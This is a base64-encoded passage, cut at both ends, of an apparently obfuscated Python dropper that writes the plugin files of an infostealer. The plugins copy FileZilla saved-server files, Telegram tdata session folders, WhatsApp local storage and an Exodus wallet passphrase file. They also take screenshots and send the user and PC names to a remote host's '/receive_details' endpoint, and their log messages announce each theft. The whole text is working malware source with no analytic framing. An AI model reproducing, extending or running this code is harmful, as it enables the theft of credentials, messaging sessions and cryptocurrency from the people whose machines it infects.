OlxyXG4gICAgICAgICAgICAgICAgaWYgZiA9PSAicGFzc3BocmFzZS5qc29uIjpcclxuICAgICAgICAgICAgICAgICAgICBpZiBub3QgaXNkaXIobG9nX2V4b2R1c19wYXRoKTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgbWtkaXIobG9nX2V4b2R1c19wYXRoKVxyXG4gICAgICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IGNvcHlmaWxlKGpvaW4oZGlycGF0aCwgZiksIGpvaW4obG9nX2V4b2R1c19wYXRoLCBmXCdwYXNzcGhyYXNlX3t0b2tlbl9oZXgoNCl9Lmpzb25cJykpJykjbGluZTo2OQogICAgX19PME8wTzAwTzAwTzBPME8wTyAoJ3BsdWdpbnMvZmlsZXppbGxhLnB5JyxiImZyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBpc2Rpciwgam9pblxyXG5mcm9tIG9zIGltcG9ydCBta2Rpciwgc2NhbmRpclxyXG5mcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleFxyXG5mcm9tIHRvb2xzIGltcG9ydCBjb3B5ZmlsZVxyXG5cclxuXHJcblxyXG5jbGFzcyBGaWxlemlsbGEoUGx1Z2luKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZiwgcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBpc2RpcihwYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIHNlYXJjaCA9IHsncmVjZW50c2VydmVycy54bWwnLCAnc2l0ZW1hbmFnZXIueG1sJ31cclxuICAgICAgICBmaWxlcyA9IHNlYXJjaC5pbnRlcnNlY3Rpb24oaS5uYW1lIGZvciBpIGluIHNjYW5kaXIocGF0aCkpXHJcblxyXG4gICAgICAgIGlmIG5vdCBmaWxlczpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIHJlc19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICdmaWxlemlsbGEnKVxyXG4gICAgICAgIGlmIG5vdCBpc2RpcihyZXNfcGF0aCk6XHJcbiAgICAgICAgICAgIG1rZGlyKHJlc19wYXRoKVxyXG4gICAgICAgIFxyXG4gICAgICAgIGZvciBmIGluIGZpbGVzOlxyXG4gICAgICAgICAgICBmaWxlbmFtZSA9IGYuc3BsaXQoJy4nKVswXVxyXG4gICAgICAgICAgICBkZXN0X3BhdGggPSBqb2luKHJlc19wYXRoLCBmJ3tmaWxlbmFtZX1fe3Rva2VuX2hleCg0KX0ueG1sJylcclxuICAgICAgICAgICAgYXdhaXQgY29weWZpbGUoam9pbihwYXRoLCBmKSwgZGVzdF9wYXRoKVxyXG5cclxuICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ0ZpbGV6aWxsYSBzdGVhbGVkIGZyb20ge3BhdGh9JykiKSNsaW5lOjcwCiAgICBfX08wTzBPMDBPMDBPME8wTzBPICgncGx1Z2lucy90ZWxlZ3JhbS5weScsYidmcm9tIHBsdWdpbnMgaW1wb3J0IFBsdWdpblxyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgaXNkaXIsIGpvaW4sIG5vcm1wYXRoXHJcbmZyb20gb3MgaW1wb3J0IG1rZGlyLCBzY2FuZGlyXHJcbmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4XHJcbmZyb20gdG9vbHMgaW1wb3J0IGNvcHlmaWxlLCBjb3B5dHJlZVxyXG5pbXBvcnQgd2lucmVnXHJcbmltcG9ydCByZVxyXG5mcm9tIHBhdGhzIGltcG9ydCBMT0NBTFxyXG5pbXBvcnQgd2luMzJjb20uY2xpZW50XHJcbmltcG9ydCBwc3V0aWxcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBzcGxpdFxyXG5cclxuXHJcblxyXG5jbGFzcyBUZWxlZ3JhbShQbHVnaW4pOlxyXG4gICAgU1RFQUxFRCA9IHNldCgpXHJcblxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG5cclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmLCBwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgcGF0aF8gPSBub3JtcGF0aChwYXRoLmxvd2VyKCkpXHJcbiAgICAgICAgaWYgcGF0aF8gaW4gVGVsZWdyYW0uU1RFQUxFRDpcclxuICAgICAgICAgICAgcmV0dXJuXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgVGVsZWdyYW0uU1RFQUxFRC5hZGQocGF0aF8pXHJcbiAgICAgICAgXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHBhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgdGRhdGFfcGF0aCA9IGpvaW4ocGF0aCwgXCd0ZGF0YVwnKVxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcih0ZGF0YV9wYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIHRlbGVncmFtX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgXCd0ZWxlZ3JhbVwnKVxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcih0ZWxlZ3JhbV9wYXRoKTpcclxuICAgICAgICAgICAgbWtkaXIodGVsZWdyYW1fcGF0aClcclxuXHJcbiAgICAgICAgcmVzX3BhdGggPSBqb2luKHRlbGVncmFtX3BhdGgsIGZcJ3RkYXRhX3t0b2tlbl9oZXgoNCl9XCcpXHJcbiAgICAgICAgbWtkaXIocmVzX3BhdGgpXHJcblxyXG4gICAgICAgIGJsYWNrbGlzdCA9IFtcJ2R1bXBzXCcsIFwnZW1vamlcJywgXCd1c2VyX2RhdGFcJywgXCd3b3JraW5nXCddXHJcblxyXG4gICAgICAgIGZvciBmIGluIHNjYW5kaXIodGRhdGFfcGF0aCk6XHJcbiAgICAgICAgICAgIGZpbGVfb2sgPSBUcnVlXHJcbiAgICAgICAgICAgIGZvciBpIGluIGJsYWNrbGlzdDpcclxuICAgICAgICAgICAgICAgIGlmIGkgaW4gZi5uYW1lOlxyXG4gICAgICAgICAgICAgICAgICAgIGZpbGVfb2sgPSBGYWxzZVxyXG4gICAgICAgICAgICAgICAgICAgIGJyZWFrXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICBpZiBub3QgZmlsZV9vazpcclxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICBmcm9tX3BhdGggPSBqb2luKHRkYXRhX3BhdGgsIGYubmFtZSlcclxuICAgICAgICAgICAgZGVzdF9wYXRoID0gam9pbihyZXNfcGF0aCwgZi5uYW1lKVxyXG5cclxuICAgICAgICAgICAgZnVuYyA9IGNvcHlmaWxlIGlmIGYuaXNfZmlsZSgpIGVsc2UgY29weXRyZWVcclxuICAgICAgICAgICAgYXdhaXQgZnVuYyhmcm9tX3BhdGgsIGRlc3RfcGF0aClcclxuXHJcbiAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZlwnVGVsZWdyYW0gc3RlYWxlZCBmcm9tIHtwYXRofVwnKVxyXG5cclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBnZXRfcmVnaXN0cnlfcGF0aCgpOlxyXG4gICAgICAgIHBhdGggPSB3aW5yZWcuSEtFWV9DTEFTU0VTX1JPT1RcclxuXHJcbiAgICAgICAgdGcgPSB3aW5yZWcuT3BlbktleUV4KHBhdGgsIHIidGRlc2t0b3AudGdcXFxcIilcclxuICAgICAgICBzaGVsbCA9IHdpbnJlZy5PcGVuS2V5RXgodGcsIHJcJ3NoZWxsXFxcXFwnKVxyXG4gICAgICAgIG9wZW5fcmcgPSB3aW5yZWcuT3BlbktleUV4KHNoZWxsLCByXCdvcGVuXFxcXFwnKVxyXG4gICAgICAgIGtleSA9IHdpbnJlZy5PcGVuS2V5RXgob3Blbl9yZywgclwnY29tbWFuZFxcXFxcJylcclxuXHJcbiAgICAgICAgdmFsdWUgPSB3aW5yZWcuRW51bVZhbHVlKGtleSwgMClcclxuXHJcbiAgICAgICAgcGF0aCA9IHJlLmZpbmRhbGwoclwnIihbXiJdKilcJywgdmFsdWVbMV0pWzJdXHJcbiAgICAgICAgcmV0dXJuIHBhdGhcclxuICAgICAgICBcclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBnZXRfbG5rX3BhdGgoKTpcclxuICAgICAgICBkZXNrdG9wID0gam9pbihMT0NBTCwgXCdkZXNrdG9wXCcpXHJcblxyXG4gICAgICAgIGZvciBpdCBpbiBzY2FuZGlyKGRlc2t0b3ApOlxyXG4gICAgICAgICAgICBpZiBpdC5uYW1lLnNwbGl0KFwnLlwnKVstMV0gPT0gXCdsbmtcJyBhbmQgXCd0ZWxlZ3JhbVwnIGluIGl0Lm5hbWUubG93ZXIoKTpcclxuICAgICAgICAgICAgICAgIHNoZWxsID0gd2luMzJjb20uY2xpZW50LkRpc3BhdGNoKCJXU2NyaXB0LlNoZWxsIilcclxuICAgICAgICAgICAgICAgIHNob3J0Y3V0ID0gc2hlbGwuQ3JlYXRlU2hvcnRDdXQoaXQucGF0aClcclxuICAgICAgICAgICAgICAgIHBhdGggPSBzaG9ydGN1dC5UYXJnZXRwYXRoLmxvd2VyKCkuc3RyaXAoXCd0ZWxlZ3JhbS5leGVcJylcclxuICAgICAgICAgICAgICAgIHJldHVybiBwYXRoXHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIGdldF90ZWxlZ3JhbXMoKTpcclxuICAgICAgICBmb3IgcHJvYyBpbiBwc3V0aWwucHJvY2Vzc19pdGVyKCk6XHJcbiAgICAgICAgICAgIGlmIFwndGVsZWdyYW1cJyBpbiBwcm9jLm5hbWUoKS5sb3dlcigpOlxyXG4gICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgIHlpZWxkIHNwbGl0KHByb2MuZXhlKCkpWzBdXHJcbiAgICAgICAgICAgICAgICBleGNlcHQ6XHJcbiAgICAgICAgICAgICAgICAgICAgcGFzcycpI2xpbmU6NzEKICAgIF9fTzBPME8wME8wME8wTzBPME8gKCdwbHVnaW5zL3doYXRzYXBwLnB5JyxiImZyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBpc2Rpciwgam9pblxyXG5mcm9tIG9zIGltcG9ydCBta2Rpciwgc2NhbmRpclxyXG5mcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleFxyXG5mcm9tIHRvb2xzIGltcG9ydCBjb3B5dHJlZVxyXG5cclxuXHJcblxyXG5jbGFzcyBXaGF0c2FwcChQbHVnaW4pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmLCBwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHBhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgZm9sZGVyID0gam9pbihwYXRoLCAnbG9jYWwgc3RvcmFnZScsICdsZXZlbGRiJylcclxuXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKGZvbGRlcik6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG4gICAgICAgIFxyXG4gICAgICAgIHdoYXRzYXBwX3Jlc19mb2xkZXIgPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ3doYXRzYXBwJylcclxuXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHdoYXRzYXBwX3Jlc19mb2xkZXIpOlxyXG4gICAgICAgICAgICBta2Rpcih3aGF0c2FwcF9yZXNfZm9sZGVyKVxyXG5cclxuICAgICAgICByZXMgPSBqb2luKHdoYXRzYXBwX3Jlc19mb2xkZXIsIGYnd2hhdHNhcHBfe3Rva2VuX2hleCg0KX0nKVxyXG5cclxuICAgICAgICBhd2FpdCBjb3B5dHJlZShmb2xkZXIsIHJlcylcclxuXHJcbiAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidXaGF0c2FwcCBzdGVhbGVkIGZyb20ge3BhdGh9JykiKSNsaW5lOjcyCiAgICBfX08wTzBPMDBPMDBPME8wTzBPICgncGx1Z2lucy9EZXRhaWxzLnB5JyxiImZyb20gYXN5bmNpbyBpbXBvcnQgY3JlYXRlX3Rhc2tcclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5pbXBvcnQgb3NcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBqb2luXHJcbmltcG9ydCBwbGF0Zm9ybVxyXG5mcm9tIGFpb2ZpbGVzIGltcG9ydCBvcGVuXHJcbmZyb20gbXNzLndpbmRvd3MgaW1wb3J0IE1TUyBhcyBtc3NcclxuZnJvbSB0b29scyBpbXBvcnQgbW92ZVxyXG5cclxuXHJcblxyXG5jbGFzcyBEZXRhaWxzKCk6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuXHJcbiAgICBhc3luYyBkZWYgdGFrZV9zY3JlZW5zaG90KHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgd2l0aCBtc3MoKSBhcyBzY3Q6XHJcbiAgICAgICAgICAgIGZvciBmaWxlbmFtZSBpbiBzY3Quc2F2ZSgpOlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgbW92ZShmaWxlbmFtZSwgam9pbihzZWxmLmNvbmYubG9nX3BhdGgsIGZpbGVuYW1lKSlcclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4YTFceGQwXHhiYVx4ZDFceDgwXHhkMFx4YjhceGQwXHhiZFx4ZDFceDg4XHhkMFx4YmVceGQxXHg4MiB7ZmlsZW5hbWV9IFx4ZDFceDgxXHhkMFx4YmVceGQxXHg4NVx4ZDFceDgwXHhkMFx4YjBceGQwXHhiZFx4ZDBceGI1XHhkMFx4YmQnKVxyXG4gXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBiZ190YXNrID0gY3JlYXRlX3Rhc2soc2VsZi50YWtlX3NjcmVlbnNob3QoKSlcclxuICAgICAgICB1c2VyID0gb3MuZ2V0bG9naW4oKVxyXG4gICAgICAgIHBjID0gcGxhdGZvcm0ubm9kZSgpXHJcbiAgICAgICAgdGFnID0gc2VsZi5jb25mLnRhZ1xyXG5cclxuICAgICAgICBkYXRhID0ge1xyXG4gICAgICAgICAgICAnY2xpZW50X2lkJzogc2VsZi5jb25mLmNsaWVudF9pZCxcclxuICAgICAgICAgICAgJ3RhZyc6IHRhZyxcclxuICAgICAgICAgICAgJ3VzZXJfbmFtZSc6IHVzZXIsXHJcbiAgICAgICAgICAgICdwY19uYW1lJzogcGNcclxuICAgICAgICB9XHJcbiAgICAgICAgXHJcbiAgICAgICAgdXJsID0gZid7c2VsZi5jb25mLmhvc3R9L3JlY2VpdmVfZGV0YWlscydcclxuXHJcbiAgICAgICAgcmVzcCA9IGF3YWl0IHNlbGYuY29uZi5zZXNzaW9uLnBvc3QodXJsLCBqc29uPWRhdGEpXHJcblxyXG4gICAgICAgIGFzeW5jIHdpdGggb3Blbihqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ2RldGFpbHMudHh0JyksICd3JywgZW5jb2Rpbmc9J3V0ZjgnKSBhcyBmOlxyXG4gICAgICAgICAgICBhd2FpdCBmLndyaXRlKGYndXNlciBuYW1lOiB7dXNlcn1cXG5wYyBuYW1lOiB7cGN9XFxudGFnOiB7dGFnfScpXHJcblxyXG4gICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4OWVceGQxXHg4Mlx4ZDFceDgxXHhkMVx4ODJceGQxXHg4M1x4ZDBceGJhIFx4ZDBceGJlXHhkMVx4ODJceGQwXHhiZlx4ZDFceDgwXHhkMFx4YjBceGQwXHhiMlx4ZDBceGJiXHhkMFx4YjVceGQwXHhiZCcpXHJcblxyXG4gICAgICAgIGF3YWl0IGJnX3Rhc2siKSNsaW5lOjczCiAgICBfX08wTzBPMDBPMDBPME8wTzBPICgncGx1Z2lucy9GaWxlemlsbGEucHknLGIiZnJvbSBwbHVnaW5zIGltcG9ydCBQbHVnaW5cclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGlzZGlyLCBqb2luXHJcbmZyb20gb3MgaW1wb3J0IG1rZGlyLCBzY2FuZGlyXHJcbmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4XHJcbmZyb20gdG9vbHMgaW1wb3J0IGNvcHlmaWxlXHJcblxyXG5cclxuXHJcbmNsYXNzIEZpbGV6aWxsYShQbHVnaW4pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmLCBwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHBhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgc2VhcmNoID0geydyZWNlbnRzZXJ2ZXJzLnhtbCcsICdzaXRlbWFuYWdlci54bWwnfVxyXG4gICAgICAgIGZpbGVzID0gc2VhcmNoLmludGVyc2VjdGlvbihpLm5hbWUgZm9yIGkgaW4gc2NhbmRpcihwYXRoKSlcclxuXHJcbiAgICAgICAgaWYgbm90IGZpbGVzOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgcmVzX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ2ZpbGV6aWxsYScpXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHJlc19wYXRoKTpcclxuICAgICAgICAgICAgbWtkaXIocmVzX3BhdGgpXHJcbiAgICAgICAgXHJcbiAgICAgICAgZm9yIGYgaW4gZmlsZXM6XHJcbiAgICAgICAgICAgIGZpbGVuYW1lID0gZi5zcGxpdCgnLicpWzBdXHJcbiAgICAgICAgICAgIGRlc3RfcGF0aCA9IGpvaW4ocmVzX3BhdGgsIGYne2ZpbGVuYW1lfV97dG9rZW5faGV4KDQpfS54bWwnKVxyXG4gICAgICAgICAgICBhd2FpdCBjb3B5ZmlsZShqb2luKHBhdGgsIGYpLCBkZXN0X3BhdGgpXHJcblxyXG4gICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnRmlsZXppbGxhIHN0ZWFsZWQgZnJvbSB7cGF0aH0nKSIpI2xpbmU6NzQKICAgIF9fTzBPME8wME8wME8wTzBPME8gKCdwbHVnaW5zL1RlbGVncmFtLnB5JyxiJ2Zyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBpc2Rpciwgam9pbiwgbm9ybXBhdGhcclxuZnJvbSBvcyBpbXBvcnQgbWtkaXIsIHNjYW5kaXJcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSB0b29scyBpbXBvcnQgY29weWZpbGUsIGNvcHl0cmVlXHJcbmltcG9ydCB3aW5yZWdcclxuaW1wb3J0IHJlXHJcbmZyb20gcGF0aHMgaW1wb3J0IExPQ0FMXHJcbmltcG9ydCB3aW4zMmNvbS5jbGllbnRcclxuaW1wb3J0IHBzdXRpbFxyXG5mcm9tIG9zLnBhdGggaW1wb3J0IHNwbGl0XHJcblxyXG5cclxuXHJcbmNsYXNzIFRlbGVncmFtKFBsdWdpbik6XHJcbiAgICBTVEVBTEVEID0gc2V0KClcclxuXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBwYXRoXyA9IG5vcm1wYXRoKHBhdGgubG93ZXIoKSlcclxuICAgICAgICBpZiBwYXRoXyBpbiBUZWxlZ3JhbS5TVEVBTEVEOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBUZWxlZ3JhbS5TVEVBTEVELmFkZChwYXRoXylcclxuICAgICAgICBcclxuICAgICAgICBpZiBub3QgaXNkaXIocGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICB0ZGF0YV9wYXRoID0gam9pbihwYXRoLCBcJ3RkYXRhXCcpXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHRkYXRhX3BhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgdGVsZWdyYW1fcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCBcJ3RlbGVncmFtXCcpXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHRlbGVncmFtX3BhdGgpOlxyXG4gICAgICAgICAgICBta2Rpcih0ZWxlZ3JhbV9wYXRoKVxyXG5cclxuICAgICAgICByZXNfcGF0aCA9IGpvaW4odGVsZWdyYW1fcGF0aCwgZlwndGRhdGFfe3Rva2VuX2hleCg0KX1cJylcclxuICAgICAgICBta2RpcihyZXNfcGF0aClcclxuXHJcbiAgICAgICAgYmxhY2tsaXN0ID0gW1wnZHVtcHNcJywgXCdlbW9qaVwnLCBcJ3VzZXJfZGF0YVwnLCBcJ3dvcmtpbmdcJ11cclxuXHJcbiAgICAgICAgZm9yIGYgaW4gc2NhbmRpcih0ZGF0YV9wYXRoKTpcclxuICAgICAgICAgICAgZmlsZV9vayA9IFRydWVcclxuICAgICAgICAgICAgZm9yIGkgaW4gYmxhY2tsaXN0OlxyXG4gICAgICAgICAgICAgICAgaWYgaSBpbiBmLm5hbWU6XHJcbiAgICAgICAgICAgICAgICAgICAgZmlsZV9vayA9IEZhbHNlXHJcbiAgICAgICAgICAgICAgICAgICAgYnJlYWtcclxuICAgICAgICAgICAgXHJcbiAgICAgICAgICAgIGlmIG5vdCBmaWxlX29rOlxyXG4gICAgICAgICAgICAgICAgY29udGludWVcclxuICAgICAgICAgICAgXHJcbiAgICAgICAgICAgIGZyb21fcGF0aCA9IGpvaW4odGRhdGFfcGF0aCwgZi5uYW1lKVxyXG4gICAgICAgICAgICBkZXN0X3BhdGggPSBqb2luKHJlc19wYXRoLCBmLm5hbWUpXHJcblxyXG4gICAgICAgICAgICBmdW5jID0gY29weWZpbGUgaWYgZi5pc19maWxlKCkgZWxzZSBjb3B5dHJlZVxyXG4gICAgICAgICAgICBhd2FpdCBmdW5jKGZyb21fcGF0aCwgZGVzdF9wYXRoKVxyXG5cclxuICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmXCdUZWxlZ3JhbSBzdGVhbGVkIGZyb20ge3BhdGh9XCcpXHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIGdldF9yZWdpc3RyeV9wYXRoKCk6XHJcbiAgICAgICAgcGF0aCA9IHdpbnJlZy5IS0VZX0NMQVNTRVNfUk9PVFxyXG5cclxuICAgICAgICB0ZyA9IHdpbnJlZy5PcGVuS2V5RXgocGF0aCwgciJ0ZGVza3RvcC50Z1xcXFwiKVxyXG4gICAgICAgIHNoZWxsID0gd2lucmVnLk9wZW5LZXlFeCh0Zywgclwnc2hlbGxcXFxcXCcpXHJcbiAgICAgICAgb3Blbl9yZyA9IHdpbnJlZy5PcGVuS2V5RXgoc2hlbGwsIHJcJ29wZW5cXFxcXCcpXHJcbiAgICAgICAga2V5ID0gd2lucmVnLk9wZW5LZXlFeChvcGVuX3JnLCByXCdjb21tYW5kXFxcXFwnKVxyXG5cclxuICAgICAgICB2YWx1ZSA9IHdpbnJlZy5FbnVtVmFsdWUoa2V5LCAwKVxyXG5cclxuICAgICAgICBwYXRoID0gcmUuZmluZGFsbChyXCciKFteIl0qKVwnLCB2YWx1ZVsxXSlbMl1cclxuICAgICAgICByZXR1cm4gcGF0aFxyXG4gICAgICAgIFxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIGdldF9sbmtfcGF0aCgpOlxyXG4gICAgICAgIGRlc2t0b3AgPSBqb2luKExPQ0FMLCBcJ2Rlc2t0b3BcJylcclxuXHJcbiAgICAgICAgZm9yIGl0IGluIHNjYW5kaXIoZGVza3RvcCk6XHJcbiAgICAgICAgICAgIGlmIGl0Lm5hbWUuc3BsaXQoXCcuXCcpWy0xXSA9PSBcJ2xua1wnIGFuZCBcJ3RlbGVncmFtXCcgaW4gaXQubmFtZS5sb3dlcigpOlxyXG4gICAgICAgICAgICAgICAgc2hlbGwgPSB3aW4zMmNvbS5jbGllbnQuRGlzcGF0Y2goIldTY3JpcHQuU2hlbGwiKVxyXG4gICAgICAgICAgICAgICAgc2hvcnRjdXQgPSBzaGVsbC5DcmVhdGVTaG9ydEN1dChpdC5wYXRoKVxyXG4gICAgICAgICAgICAgICAgcGF0aCA9IHNob3J0Y3V0LlRhcmdldHBhdGgubG93ZXIoKS5zdHJpcChcJ3RlbGVncmFtLmV4ZVwnKVxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIHBhdGhcclxuXHJcbiAgICBAc3RhdGljbWV0aG9kXHJcbiAgICBkZWYgZ2V0X3RlbGVncmFtcygpOlxyXG4gICAgICAgIGZvciBwcm9jIGluIHBzdXRpbC5wcm9jZXNzX2l0ZXIoKTpcclxuICAgICAgICAgICAgaWYgXCd0ZWxlZ3JhbVwnIGluIHByb2MubmFtZSgpLmxvd2VyKCk6XHJcbiAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgeWllbGQgc3BsaXQocHJvYy5leGUoKSlbMF1cclxuICAgICAgICAgICAgICAgIGV4Y2VwdDpcclxuICAgICAgICAgICAgICAgICAgICBwYXNzJykjbGluZTo3NQogICAgX19PME8wTzAwTzAwTzBPME8wTyAoJ3BsdWdpbnMvV2hhdHNhcHAucHknLGIiZnJvbSBwbHVnaW5zIGltcG9ydCBQbHVnaW5cclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGlzZGlyLCBqb2luXHJcbmZyb20gb3MgaW1wb3J0IG1rZGlyLCBzY2FuZGlyXHJcbmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4XHJcbmZyb20gdG9vbHMgaW1wb3J0IGNvcHl0cmVlXHJcblxyXG5cclxuXHJcbmNsYXNzIFdoYXRzYXBwKFBsdWdpbik6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNkaXIocGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICBmb2xkZXIgPSBqb2luKHBhdGgsICdsb2NhbCBzdG9yYWdlJywgJ2xldmVsZGInKVxyXG5cclxuICAgICAgICBpZiBub3QgaXNkaXIoZm9sZGVyKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcbiAgICAgICAgXHJcbiAgICAgICAgd2hhdHNhcHBfcmVzX2ZvbGRlciA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAnd2hhdHNhcHAnKVxyXG5cclxuICAgICAgICBpZiBub3QgaXNkaXIod2hhdHNhcHBfcmVzX2ZvbGRlcik6XHJcbiAgICAgICAgICAgIG1rZGlyKHdoYXRzYXBwX3Jlc19mb2xkZXIpXHJcblxyXG4gICAgICAgIHJlcyA9IGpvaW4od2hhdHNhcHBfcmVzX2ZvbGRlciwgZid3aGF0c2FwcF97dG9rZW5faGV4KDQpfScpXHJcblxyXG4gICAgICAgIGF3YWl0IGNvcHl0cmVlKGZvbGRlciwgcmVzKVxyXG5cclxuICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1doYXRzYXBwIHN0ZWFsZWQgZnJvbSB7cGF0aH0nKSIpI2xpbmU6NzYKI